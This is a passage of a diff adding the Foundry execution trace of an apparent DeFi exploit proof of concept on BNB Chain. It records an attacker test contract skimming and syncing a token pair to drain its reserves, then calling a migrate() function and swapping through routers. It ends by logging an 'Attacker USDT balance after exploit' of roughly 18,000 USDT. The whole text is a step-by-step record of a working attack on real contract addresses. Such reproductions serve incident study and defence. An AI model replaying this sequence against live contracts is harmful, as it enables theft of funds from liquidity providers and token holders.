+    │   │   │   │   └─ ← [Return] 1046510462623 [1.046e12]
+    │   │   │   ├─ emit Sync(reserve0: 6406787240435 [6.406e12], reserve1: 1046510462623 [1.046e12])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 1023619669176 [1.023e12], amount0Out: 177863969485533 [1.778e14], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   └─ ← [Return] 6406787240435 [6.406e12]
+    │   │   ├─ [11653] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transfer(0x429339fa7A2f2979657B25ed49D64d4b98a2050d, 64067872404360 [6.406e13])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 1281357448086 [1.281e12])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, value: 64067872404360 [6.406e13])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [23698] 0x429339fa7A2f2979657B25ed49D64d4b98a2050d::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   └─ ← [Return] 70474659644795 [7.047e13]
+    │   │   │   ├─ [11653] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 64067872404360 [6.406e13])
+    │   │   │   │   ├─ emit Transfer(from: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, to: 0x0000000000000000000000000000000000000000, value: 1281357448086 [1.281e12])
+    │   │   │   │   ├─ emit Transfer(from: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 64067872404360 [6.406e13])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   └─ ← [Return] 1046510462623 [1.046e12]
+    │   │   │   ├─ [3452] 0xC632F90affeC7121120275610BF17Df9963F181c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   ├─ emit Transfer(from: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [9038] 0x429339fa7A2f2979657B25ed49D64d4b98a2050d::sync()
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   └─ ← [Return] 5
+    │   │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   └─ ← [Return] 1046510462623 [1.046e12]
+    │   │   │   ├─ emit Sync(reserve0: 5, reserve1: 1046510462623 [1.046e12])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [62726] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(100000000 [1e8], 0, [0xC2319E87280c64e2557a51Cb324713Dd8d1410a3, 0xC632F90affeC7121120275610BF17Df9963F181c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670859422 [1.67e9])
+    │   │   │   ├─ [14474] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, 100000000 [1e8])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 2000000 [2e6])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, value: 100000000 [1e8])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007912929639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [893] 0x429339fa7A2f2979657B25ed49D64d4b98a2050d::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 5, 1046510462623 [1.046e12], 1670859422 [1.67e9]
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   └─ ← [Return] 100000005 [1e8]
+    │   │   │   ├─ [38506] 0x429339fa7A2f2979657B25ed49D64d4b98a2050d::swap(0, 1046510410166 [1.046e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [23352] 0xC632F90affeC7121120275610BF17Df9963F181c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1046510410166 [1.046e12])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1046510410166 [1.046e12])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 100000005 [1e8]
+    │   │   │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 52457 [5.245e4]
+    │   │   │   │   ├─ emit Sync(reserve0: 100000005 [1e8], reserve1: 52457 [5.245e4])
+    │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 100000000 [1e8], amount1In: 0, amount0Out: 0, amount1Out: 1046510410166 [1.046e12], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1046510410166 [1.046e12]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3452] 0xC632F90affeC7121120275610BF17Df9963F181c::transfer(0x559D0deAcAD259d970f65bE611f93fCCD1C44261, 952380953380 [9.523e11])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, value: 952380953380 [9.523e11])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   ├─ [952] 0x169f715CaE1F94C203366a6890053E817C767B7C::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   └─ ← [Return] 10213388531131332 [1.021e16]
+    │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   └─ ← [Return] 4220846906206 [4.22e12]
+    │   ├─ emit Sync(reserve0: 10213388531131332 [1.021e16], reserve1: 4220846906206 [4.22e12])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 952380953380 [9.523e11], amount0Out: 0, amount1Out: 950000000000 [9.5e11], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Stop] 
+    ├─ [35050] 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb::migrate()
+    │   ├─ [34658] 0x67d7249D581169516E49a88eEC11370234100fb7::migrate() [delegatecall]
+    │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 171457072245114 [1.714e14]
+    │   │   ├─ [567] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::isExcludedFromFee(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [14474] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, 155870065677375 [1.558e14])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 3117401313546 [3.117e12])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, value: 155870065677375 [1.558e14])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, value: 115792089237316195423570985008687907853269984665640564039457583690779637057470 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4640] 0x169f715CaE1F94C203366a6890053E817C767B7C::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 171457072245114 [1.714e14])
+    │   │   │   ├─ emit Transfer(from: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 171457072245114 [1.714e14])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [7673] 0x169f715CaE1F94C203366a6890053E817C767B7C::transferFrom(0x077D12657826369A01638500229205995F78e206, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17145707224511 [1.714e13])
+    │   │   │   ├─ emit Approval(owner: 0x077D12657826369A01638500229205995F78e206, spender: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, value: 95465262987594575513 [9.546e19])
+    │   │   │   ├─ emit Transfer(from: 0x077D12657826369A01638500229205995F78e206, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 17145707224511 [1.714e13])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [952] 0x169f715CaE1F94C203366a6890053E817C767B7C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 190554066935182 [1.905e14]
+    ├─ [48397] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(171498660241663 [1.714e14], 0, [0x169f715CaE1F94C203366a6890053E817C767B7C, 0xC632F90affeC7121120275610BF17Df9963F181c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670859422 [1.67e9])
+    │   ├─ [19223] 0x169f715CaE1F94C203366a6890053E817C767B7C::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, 171498660241663 [1.714e14])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAE85A0d7406e83436A9d0753c8F9Fe1fcbb6FcD8, value: 6859946409664 [6.859e12])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x077D12657826369A01638500229205995F78e206, value: 6859946409664 [6.859e12])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 3429973204832 [3.429e12])
+    │   │   ├─ emit Fee(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 17149866024160 [1.714e13])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, value: 171498660241663 [1.714e14])
+    │   │   └─ ← [Return] true
+    │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 94129456786 [9.412e10]
+    │   ├─ [893] 0x559D0deAcAD259d970f65bE611f93fCCD1C44261::getReserves() [staticcall]
+    │   │   └─ ← [Return] 10213388531131332 [1.021e16], 4220846906206 [4.22e12], 1670859422 [1.67e9]
+    │   ├─ [952] 0x169f715CaE1F94C203366a6890053E817C767B7C::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   └─ ← [Return] 10384887191372995 [1.038e16]
+    │   ├─ [19017] 0x559D0deAcAD259d970f65bE611f93fCCD1C44261::swap(0, 69532746398 [6.953e10], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [3452] 0xC632F90affeC7121120275610BF17Df9963F181c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69532746398 [6.953e10])
+    │   │   │   ├─ emit Transfer(from: 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 69532746398 [6.953e10])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [952] 0x169f715CaE1F94C203366a6890053E817C767B7C::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   │   └─ ← [Return] 10384887191372995 [1.038e16]
+    │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   │   └─ ← [Return] 4151314159808 [4.151e12]
+    │   │   ├─ emit Sync(reserve0: 10384887191372995 [1.038e16], reserve1: 4151314159808 [4.151e12])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 171498660241663 [1.714e14], amount1In: 0, amount0Out: 0, amount1Out: 69532746398 [6.953e10], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 163662203184 [1.636e11]
+    │   └─ ← [Stop] 
+    ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 163662203184 [1.636e11]
+    ├─ [92203] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(163662203184 [1.636e11], 0, [0xC632F90affeC7121120275610BF17Df9963F181c, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670859422 [1.67e9])
+    │   ├─ [11072] 0xC632F90affeC7121120275610BF17Df9963F181c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xBE46815E0F0123ad626B82A0166eaa32274104f5, 163662203184 [1.636e11])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBE46815E0F0123ad626B82A0166eaa32274104f5, value: 163662203184 [1.636e11])
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007749467436751 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2893] 0xBE46815E0F0123ad626B82A0166eaa32274104f5::getReserves() [staticcall]
+    │   │   └─ ← [Return] 4303507559445956771661155 [4.303e24], 38730982546505 [3.873e13], 1670859395 [1.67e9]
+    │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0xBE46815E0F0123ad626B82A0166eaa32274104f5) [staticcall]
+    │   │   └─ ← [Return] 38894644749689 [3.889e13]
+    │   ├─ [62399] 0xBE46815E0F0123ad626B82A0166eaa32274104f5::swap(18063363736130073638413 [1.806e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [27971] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18063363736130073638413 [1.806e22])
+    │   │   │   ├─ emit Transfer(from: 0xBE46815E0F0123ad626B82A0166eaa32274104f5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18063363736130073638413 [1.806e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xBE46815E0F0123ad626B82A0166eaa32274104f5) [staticcall]
+    │   │   │   └─ ← [Return] 4285444195709826698022742 [4.285e24]
+    │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0xBE46815E0F0123ad626B82A0166eaa32274104f5) [staticcall]
+    │   │   │   └─ ← [Return] 38894644749689 [3.889e13]
+    │   │   ├─ emit Sync(reserve0: 4285444195709826698022742 [4.285e24], reserve1: 38894644749689 [3.889e13])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 163662203184 [1.636e11], amount0Out: 18063363736130073638413 [1.806e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 18063363736130073638413 [1.806e22]
+    │   └─ ← [Stop] 
+    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 18063363736130073638413 [1.806e22]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 18063363736130073638413 [1.806e22], decimals: 18)
+    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 8795805412983842275 [8.795e18]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 8795805412983842275 [8.795e18], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 267.83ms (4.63ms CPU time)
+
+Ran 2 test suites in 269.40ms (499.39ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
